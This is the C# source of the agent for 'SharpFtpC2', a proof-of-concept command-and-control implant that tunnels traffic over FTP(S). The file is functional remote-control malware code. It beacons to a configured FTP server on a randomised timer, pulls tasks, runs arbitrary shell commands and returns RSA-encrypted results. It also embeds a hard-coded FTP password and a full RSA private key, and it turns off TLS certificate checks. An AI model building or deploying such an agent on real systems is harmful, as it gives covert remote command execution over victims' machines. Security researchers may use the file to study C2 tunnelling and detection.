/*
 * =========================================================================================
 * Project:       SharpFtpC2 - Agent (v1.0 Beta)
 * 
 * Description:   SharpFtpShell is a compact C# project that showcases the technique
 *                of tunneling Command and Control (C2) communication via FTP(S).
 * 
 * Author:        Jean-Pierre LESUEUR (@DarkCoderSc)
 * Email:         jplesueur@phrozen.io
 * Website:       https://www.phrozen.io
 * GitHub:        https://github.com/DarkCoderSc
 * Twitter:       https://twitter.com/DarkCoderSc
 * License:       Apache-2.0
 * =========================================================================================
 */

using FtpAgent;
using FtpC2.Responses;
using FtpC2.Tasks;
using System.Net;
using System.Text;
using System.Text.Json;

class Program
{
    // In this Proof of Concept (PoC), the "AgentSession" GUID changes with each process instance.
    // If you require a unique identifier for each machine/user, it is advisable to replace this code
    // with a custom logic tailored to your needs.
    public static readonly Guid AgentSession = Guid.NewGuid();

    // EDIT HERE BEGIN ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
    public static readonly string FtpHost = "127.0.0.1";
    public static readonly string FtpUser = "dark";
    public static readonly string FtpPwd = "toor";
    public static readonly bool FtpSecure = false;

    public static readonly int BeaconDelayMin = 500;
    public static readonly int BeaconDelayMax = 1000;

    // Ensure that this contains the RSA Private Key for the Agent, which is used to decrypt data received
    // from the C2. Utilize the RSAKeyHelper Tool to generate a fresh pair of Private and Public keys.
    public static readonly string EncodedPrivateKey = "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";

    // Make sure this includes the RSA Public Key belonging to the C2, which is utilized for encrypting
    // data that is sent to the C2's destination.
    public static readonly string EncodedC2PublicKey = "MIICCgKCAgEAw24iWtReiSmA2R5ncKxC1yHMx3oQPNfKbKYWa6ioLhW5GqDQ/GTyVtH2P+FH6fWLOLj3dxfmJFr8KnmcfbQ1wEtDy/zIc+FJRwU/6xFFgnZ4tXIY+jEvwomOMTEm+cHULZr3+laBI/uQdX5hEUDUg12MYYI+kM4SLjRYvdIKgM+nRITwenZUEEpdcieCdvv77XZ1QGB9gcXKNYfopIqWX7kOJTrO2qbnvvhm+/jSRqglkA3oga3h7n7jfu5jBMY5QOBldA5hM5Dc5+1/iK13NhZY3L6drf8PxuQewsuiorK2K0raK6PDL8pe/ZDmYiIUdehaNyeMiScx7mceU7DxU2JhLzdpxbbPeFHwjvwPl7zMU0JHRZQ9b3kxiflcGYR+yFVq+G5Yc99jDp2lCig+rsEOWkVvJgKcD2HALnyHfbXEVEwT9Qa19PCKq8J9dtEgJ6Su/nO1nyG8nERBEA0q1OEr43MHx5RHxMiMg9GoNjzknwzTB9PrwbjIfuaPFpC5fGzdNPuhzyouVnay7W50XIpqr9DTZjlr0ec9Ln6RWQKoaFcyzLMBY9VZJ+eA1SakqW+Gic/vGDL4cH63NPsxbAVWW7AJzrefd9V1m45kBOQ94qFzfUomwKee2+NqA78UCnyB93QgVmzMSxZ47+Co6KIfy65ije+RJj6sc5dFBnECAwEAAQ==";

    // EDIT HERE END ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++  

    public static AsymEncryptionHelper? Decryptor;
    public static AsymEncryptionHelper? PeerEncryptor;

    public static CancellationTokenSource CancellationTokenSource = new();

    public static void OnProcessExit(object? sender, EventArgs e)
    {
        Decryptor?.Dispose();
        PeerEncryptor?.Dispose();
    }

    public static string OnEgressDataModifier(string data)
    {
        if (PeerEncryptor == null || !PeerEncryptor.HasPublicKey)
            return data;

        return PeerEncryptor.EncryptToJson(Encoding.UTF8.GetBytes(data));
    }

    public static string OnIngressDataModifier(string data)
    {
        if (Decryptor == null || !Decryptor.HasPrivateKey)
            return data;

        return Encoding.UTF8.GetString(Decryptor.DecryptFromJson(data));
    }

    public static void Main(string[] args)
    {
        // Important Notice: The delegate below renders the current application susceptible to
        // Man-in-the-Middle (MITM) attacks when utilizing SSL/TLS features.
        // This configuration was implemented to accommodate self-signed certificates.
        // However, it is strongly advised not to employ this approach in a production environment
        // if SSL/TLS security is expected.
        if (FtpSecure)
            ServicePointManager.ServerCertificateValidationCallback = delegate { return true; };
        ///

        AppDomain.CurrentDomain.ProcessExit += OnProcessExit;

        UX.DisplayInfo($"Agent Id: `{AgentSession}`");
        ///

        try
        {
            Decryptor = new(null, EncodedPrivateKey);
        }
        catch
        {
            Decryptor = null;
        }

        try
        {
            PeerEncryptor = new(EncodedC2PublicKey, null);
        }
        catch
        {
            PeerEncryptor = null;
        }

        List<Thread> daemons = new();

        // It is crucial for this thread to maintain high availability in order to continuously
        // signal to the Command and Control (C2) that our agent is operational.
        // To achieve this, only the "RegisterOrUpdateAgent" method is invoked at regular intervals,
        // minimizing resource consumption and ensuring consistent communication with the C2.
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            AgentProtocol agentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);

            agentProto.EgressDataModifier = OnEgressDataModifier;
            agentProto.IngressDataModifier = OnIngressDataModifier;

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Signal C2, we are still active.
                    agentProto.RegisterOrUpdateAgent();

                    ///
                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax));
                }
                catch (Exception ex) 
                {
                    UX.DisplayError($"@DaemonBeaconThread: {ex.Message}");
                };
            }
        }));

        // This thread is specifically allocated for the enumeration of agent tasks
        // (which are registered by the controller) as well as the processing and response
        // of these tasks. This ensures a focused and efficient handling of agent-related
        // tasks.
        daemons.Add(new Thread((object? obj) =>
        {
            if (obj == null)
                return;

            AgentProtocol agentProto = new(FtpHost, FtpUser, FtpPwd, FtpSecure, AgentSession);

            agentProto.EgressDataModifier = OnEgressDataModifier;
            agentProto.IngressDataModifier = OnIngressDataModifier;

            CancellationToken cancellationToken = (CancellationToken)obj;
            while (!cancellationToken.IsCancellationRequested)
            {
                try
                {
                    // Gather C2 Tasks.
                    List<TaskWrapper> tasks = agentProto.EnumerateTasks();                    

                    // Process Tasks:
                    foreach (TaskWrapper task in tasks)
                    {
                        ResponseWrapper? response = null;
                        ///

                        UX.DisplayInfo($"Process new task(`{task.Id}`) of type `{task.GetType().Name}`...");

                        switch (task)
                        {
                            case TaskShellCommand taskShellCommand:
                                {
                                    response = new ResponseShellCommand();

                                    ((ResponseShellCommand)response).RunShellCommand(taskShellCommand.Command ?? "");                                    

                                    break;
                                }

                            case TaskCommand taskCommand:
                                {
                                    switch(taskCommand.Command)
                                    {
                                        case TaskCommand.CommandKind.TerminateAgent:
                                            {
                                                CancellationTokenSource.Cancel();

                                                response = new ResponseNotification();

                                                ((ResponseNotification)response).Kind = ResponseNotification.NotificationKind.AgentTerminated;                                                

                                                break;
                                            }
                                    }

                                    break;
                                }

                            // Handle other tasks and response bellow:
                            // ...

                            default:
                                {
                                    UX.DisplayWarning($"Task(`{task.Id}`) of type `{task.GetType().Name}` is unknown.");

                                    break;
                                }
                        }

                        if (response != null)
                        {
                            agentProto.RegisterNewResponse(response, task.Id);

                            UX.DisplaySuccess($"Task(`{task.Id}`) successfully processed.");
                        }
                    }                                       

                    ///
                    Thread.Sleep(new Random().Next(BeaconDelayMin, BeaconDelayMax));
                }
                catch (Exception ex)
                {
                    UX.DisplayError($"@DaemonTasksThread: {ex.Message}");
                };
            }
        }));

        // The action to handle a CTRL+C signal on the console has been registered.
        // When triggered, it will instruct any associated cancellation tokens to properly
        // shut down their associated daemons.
        Console.CancelKeyPress += (sender, cancelEventArgs) =>
        {
            CancellationTokenSource.Cancel(); // Signal tokens that application needs to be closed.

            cancelEventArgs.Cancel = true; // Cancel default behaviour
        };

        // Start daemons
        foreach (Thread daemon in daemons)
            daemon.Start(CancellationTokenSource.Token);

        // Keep process running until CTRL+C.
        CancellationToken token = CancellationTokenSource.Token;
        while (!token.IsCancellationRequested)
            Thread.Sleep(1000);

        // Wait for daemons to join main thread
        foreach (Thread daemon in daemons)
            daemon.Join();
    }
}